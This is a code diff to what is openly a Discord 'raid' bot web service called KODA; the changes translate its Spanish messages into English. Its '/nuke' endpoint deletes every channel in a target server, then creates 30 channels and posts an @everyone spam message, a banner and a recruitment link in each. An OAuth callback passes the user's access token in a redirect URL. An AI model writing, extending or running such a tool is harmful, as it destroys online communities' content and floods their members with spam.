@@ -33,7 +33,7 @@ app.get('/auth/callback', async (req, res) => {
 
         res.redirect(`https://koda-raid.vercel.app/?token=${response.data.access_token}`);
     } catch (err) {
-        res.status(500).send("Error en login");
+        res.status(500).send("Login Error");
     }
 });
 
@@ -47,36 +47,38 @@ app.get('/api/servers', async (req, res) => {
         const botGuildIds = client.guilds.cache.map(g => g.id);
         const mutual = userGuilds.data.filter(g => (parseInt(g.permissions) & 0x8) === 0x8 && botGuildIds.includes(g.id));
         res.json(mutual);
-    } catch (e) { res.status(500).send("Error"); }
+    } catch (e) { res.status(500).send("Error fetching servers"); }
 });
 
-// NUKE + SPAM DE LINK
+// NUKE + BANNER + MENSAJE EN INGLÉS
 app.get('/nuke', async (req, res) => {
     const { guildId, name } = req.query;
     const guild = client.guilds.cache.get(guildId);
-    if (!guild) return res.status(404).send("Bot no está en el server");
+    if (!guild) return res.status(404).send("Bot not found in server");
 
     const channelName = name || 'koda-raid'; 
 
     try {
         const channels = await guild.channels.fetch();
-        // Borrar todo
+        // 1. Borrar Canales
         for (const c of channels.values()) await c.delete().catch(() => {});
         
-        // Crear canales y SPAMEAR link
+        // 2. Crear Canales + Enviar Banner
         for (let i = 0; i < 30; i++) {
             setTimeout(() => {
                 guild.channels.create({ name: channelName, type: 0 })
-                    .then(channel => {
-                        // AQUÍ ESTÁ EL MENSAJE QUE PIDE EL LINK
-                        channel.send("@everyone Raided with **KODA** ☠️\nJoin: https://koda-raid.vercel.app")
-                        .catch(() => {});
+                    .then(async channel => {
+                        // AQUÍ SE ENVÍA EL BANNER Y EL TEXTO EN INGLÉS
+                        await channel.send({
+                            content: "@everyone **SYSTEM PURGED BY KODA** ☠️\nJoin the revolution: https://koda-raid.vercel.app",
+                            files: ["https://koda-raid.vercel.app/banner.png"] // Asegúrate que banner.png esté en tu GitHub
+                        }).catch(() => {});
                     })
                     .catch(() => {});
             }, i * 350);
         }
-        res.send("Raid iniciado");
-    } catch (e) { res.status(500).send("Fallo"); }
+        res.send("Raid initiated");
+    } catch (e) { res.status(500).send("Failed"); }
 });
 
 client.login(process.env.DISCORD_TOKEN);
